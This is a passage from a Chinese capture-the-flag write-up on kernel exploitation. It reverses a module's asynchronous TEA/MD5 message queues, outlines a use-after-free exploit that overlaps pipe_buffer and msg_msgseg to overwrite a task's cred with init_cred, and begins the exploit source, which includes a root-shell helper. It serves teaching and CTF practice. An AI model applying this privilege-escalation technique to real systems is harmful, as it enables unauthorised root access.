class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_read_k2u_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// rbx</span><br>  __int64 v2; <span class="hljs-comment">// rbx</span><br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  __int64 v4; <span class="hljs-comment">// r14</span><br>  __int16 v5; <span class="hljs-comment">// ax</span><br><br>  mutex_lock(&amp;k2u_lock);<br>  v1 = k2u_head;<br>  <span class="hljs-keyword">if</span> ( k2u_head != k2u_tail )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>      _ubsan_handle_out_of_bounds(&amp;off_24D0, k2u_head);<br>    v2 = k2u_queue[v1];<br>    <span class="hljs-keyword">if</span> ( !copy_to_user(a1, v2, <span class="hljs-number">24LL</span>) )<br>    &#123;<br>      v3 = *(_QWORD *)(v2 + <span class="hljs-number">16</span>);<br>      <span class="hljs-keyword">if</span> ( (v3 &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2 + <span class="hljs-number">24</span>, *(_QWORD *)(v2 + <span class="hljs-number">16</span>), <span class="hljs-number">1LL</span>);<br>      <span class="hljs-keyword">if</span> ( !copy_to_user(a1 + <span class="hljs-number">24</span>, v2 + <span class="hljs-number">24</span>, v3) )<br>      &#123;<br>        v4 = k2u_head;<br>        v5 = k2u_head;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>        &#123;<br>          _ubsan_handle_out_of_bounds(&amp;off_24F0, k2u_head);<br>          v5 = k2u_head;<br>        &#125;<br>        k2u_queue[v4] = <span class="hljs-number">0LL</span>;<br>        k2u_head = (v5 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>      &#125;<br>    &#125;<br>    kfree(v2);<br>  &#125;<br>  mutex_unlock(&amp;k2u_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>那么读取 <code>u2k</code> 队列与写入 <code>k2u</code> 队列的功能在哪完成呢？让我们将目光放回初始化函数，在完成设备文件注册后其会启动一个 CPU 核心数个内核线程（本题为 1 个），该线程会执行函数 <code>kkk_msg_handler_fn()</code>，这个函数比较长我们一步一步来分析</p><blockquote><p>本来想弄多个内核线程的，但是这样难度好像又太高了点（笑），所以只弄了一个</p></blockquote><p>该函数整体是一个大循环，开头有个小循环内部会循环轮询 <code>u2k</code> 队列，若不为空则从中取出一个 object，若 object 开头的字段不为 <code>1</code> 则释放掉并重新继续循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">kkk_msg_handler_fn</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// r14</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// rdi</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// r15</span><br>  __int64 v5; <span class="hljs-comment">// rax</span><br>  __int64 v6; <span class="hljs-comment">// rax</span><br>  __int16 v7; <span class="hljs-comment">// cx</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// rdi</span><br>  __int64 v9; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> *v10; <span class="hljs-comment">// rdi</span><br>  __int64 v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  v11[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_read_u2k_queue(v11) )<br>        msleep(<span class="hljs-number">1000LL</span>);<br>      v0 = v11[<span class="hljs-number">0</span>];<br>      <span class="hljs-keyword">if</span> ( *(_WORD *)v11[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">break</span>;<br>      printk(&amp;unk_1743);<br>LABEL_24:<br>      msg_free(v11[<span class="hljs-number">0</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>接下来是一个巨大的 switch，根据从 <code>u2k</code> 队列中取出的 object 指定字段的值进行相应处理，主要实现了 <code>tea</code> 加密、<code>tea</code> 解密、<code>md5</code> 哈希算法三种功能</p><p>在完成请求后会根据选项不同与执行结果不同选择是否将该 object 重用并写入 <code>k2u</code> 队列或是分配一个新的 <code>object</code> 写入 <code>k2u</code> 队列，对于 <code>md5</code> 哈希请求而言总会分配一个新的 object，而 <code>tea</code> 加解密请求则会，作为请求执行的结果返回给用户：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">switch</span> ( v1 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        v5 = msg_alloc(<span class="hljs-number">16LL</span>);<br>        <span class="hljs-keyword">if</span> ( v5 )<br>        &#123;<br>          v4 = v5;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_crypto_hash_md5((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">24</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>)) )<br>          &#123;<br>            printk(&amp;unk_17E1);<br>            v7 = <span class="hljs-number">2</span>;<br>            v6 = <span class="hljs-number">0LL</span>;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            v6 = <span class="hljs-number">16LL</span>;<br>            v7 = <span class="hljs-number">1</span>;<br>          &#125;<br>          *(_DWORD *)v4 = <span class="hljs-number">196610</span>;<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = v7;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_23;<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_32;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        v8 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">0x18</span> || (v8 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_17AD;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v9 = msg_alloc(v8 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v9 )<br>        &#123;<br>LABEL_27:<br>          v10 = &amp;unk_1795;<br>LABEL_31:<br>          printk(v10);<br>          <span class="hljs-keyword">goto</span> LABEL_32;<br>        &#125;<br>        v4 = v9;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_decrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = <span class="hljs-number">131074</span>;<br>LABEL_22:<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = <span class="hljs-number">1</span>;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          v6 = *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>;<br>LABEL_23:<br>          *(_QWORD *)(v4 + <span class="hljs-number">16</span>) = v6;<br>          kkk_write_k2u_queue(v4);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        v2 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0x18</span> || (v2 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_1761;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v3 = msg_alloc(v2 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v3 )<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        v4 = v3;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_encrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = (_DWORD)&amp;unk_10002;<br>          <span class="hljs-keyword">goto</span> LABEL_22;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        *(_WORD *)v11[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span>;<br>        *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>        printk(&amp;unk_1808);<br>        <span class="hljs-keyword">goto</span> LABEL_33;<br>    &#125;<br>    kfree(v4);<br>LABEL_32:<br>    *(_WORD *)v0 = <span class="hljs-number">2</span>;<br>    *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>LABEL_33:<br>    kkk_write_k2u_queue(v0);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逆向分析我们不难获得 <code>u2k</code> 与 <code>k2u</code> 队列中的 object 的结构体定义：</p><blockquote><p><del>👴自己逆半天得的，没有偷偷看源码</del></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint32_t</span> status;<br>    <span class="hljs-type">uint64_t</span> tag;<br>    <span class="hljs-type">uint64_t</span> data_len;<br>    <span class="hljs-type">uint8_t</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>那么这个内核模块的全貌便已经展现在我们面前了：用户通过 <code>ioctl()</code> 向请求队列 <code>u2k</code> 中放入请求消息（每条消息附带一个 header），内核线程异步地从 <code>u2k</code> 队列中读取消息，根据其类型进行处理，完成之后将结果放回 <code>k2u</code> 队列，由用户进行异步读取；对于请求与响应消息长度相同的，内核会复用相应的 object，否则会分配新的 object 作为返回结果并释放储存原有请求信息的 object</p><p>严格意义上来说这道题其实没有完全完成，笔者原本想要写一个完整的用户与内核间的  <em>异步通信消息处理框架</em>  ，但是最后只完成了异步通信队列，没有完成基于内存共享的状态查询部分，不过我们仍能通过 <code>ioctl()</code> 直接读取的方式完成轮询，就是开销巨大：）</p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用 UAF 将 <code>pipe_buffer</code> 和 <code>msg_msgseg</code> 分配到一起，读写 pipe 使得其使用 <code>pipe_buffer[1]</code> 以避免 <code>msg_msgseg</code> 开头的 NULL 干扰，之后不断重分配 <code>msg_msgseg</code> 进行内存搜索找到当前进程的 <code>task_struct</code> 并将 <code>task_struct-&gt;cred</code> 改为 <code>init_cred</code> 即可完成提权</p><p>这里没有选择将两个 <code>pipe_buffer</code> 分配到同一个 object 的方式是因为<strong>题目开启了</strong> <code>CONFIG_INIT_ON_FREE_DEFAULT_ON</code> <strong>，所有的内核对象在释放后都会被清零</strong>，因此我们很难直接构造出 page-level UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell 